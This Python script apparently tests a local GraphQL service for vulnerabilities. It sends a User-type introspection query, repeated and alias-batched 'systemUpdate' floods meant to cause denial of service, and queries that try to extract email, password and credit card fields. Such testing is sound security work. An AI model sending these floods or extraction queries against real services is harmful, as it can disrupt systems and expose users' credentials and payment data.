import requests
import json

# Define the GraphQL endpoint URL
GRAPHQL_URL = "http://localhost:5013/graphql"

def check_resource_request(url):
    resource_query = {
        'query': '''{
            __type(name: "User") {
                name
                fields {
                    name
                    type {
                        name
                        kind
                        ofType {
                            name
                            kind
                        }
                    }
                }
            }
        }'''}

    try:
        response = requests.post(url, json=resource_query)
        response.raise_for_status()
        response_json = response.json()

        if 'data' in response_json and '__type' in response_json['data']:
            print("[!] Excessive resource request vulnerability found at", url)
            print("Evidence:", json.dumps(response_json, indent=4))
        else:
            print("[-] No excessive resource request vulnerability found at", url)
    except Exception as e:
        print("Error during resource request check:", e)

def test_dos_attack():
    query = "query { systemUpdate }" * 100 
    print("Running DoS attack test...")
    try:
        status_codes = []
        for i in range(100):  
            response = requests.post(GRAPHQL_URL, json={"query": query})
            status_codes.append(response.status_code)
        print("[+] DoS attack test status codes:", status_codes)
        if 200 not in status_codes:
            print("[+] DoS attack test successful.")
        else:
            print("[-] DoS attack test failed: Server responded with 200 status code.")
    except Exception as e:
        print("[-] DoS attack test failed:", e)

def test_alias_attack():
    query_list = []
    for i in range(100):
        alias = f"q{i}: systemUpdate"
        query_list.append(alias)

    query = "\n".join(query_list)
    print("Running alias-based attack test...")
    try:
        status_codes = []
        for i in range(100):  
            response = requests.post(GRAPHQL_URL, json={"query": query})
            status_codes.append(response.status_code)
        print("[+] Alias-based attack test status codes:", status_codes)
        if 200 not in status_codes:
            print("[+] Alias-based attack test successful.")
        else:
            print("[-] Alias-based attack test failed: Server responded with 200 status code.")

    except Exception as e:
        print("[-] Alias-based attack test failed:", e)

def test_sensitive_data():
    sensitive_fields = [
        'email',
        'password',
        'creditCardNumber',
    ]

    print("Running sensitive data test...")
    try:
        for field in sensitive_fields:
            sensitive_query = {
                'query': f'''
                {{
                    search(query: "{field}") {{
                        id
                        {field}
                    }}
                }}
                '''
            }
            response = requests.post(GRAPHQL_URL, json=sensitive_query)
            response.raise_for_status()
            response_json = response.json()

            if 'data' in response_json and 'search' in response_json['data']:
                print(f"[!] Sensitive data leak detected in field: {field}")
                print("Evidence:", json.dumps(response_json, indent=4))
            else:
                print(f"[-] No sensitive data leak detected in field: {field}")
    except Exception as e:
        print("Error during sensitive data test:", e)


if __name__ == "__main__":
    url = GRAPHQL_URL
    print("Running test cases...")
    check_resource_request(url)
    test_dos_attack()
    test_alias_attack()
    test_sensitive_data()
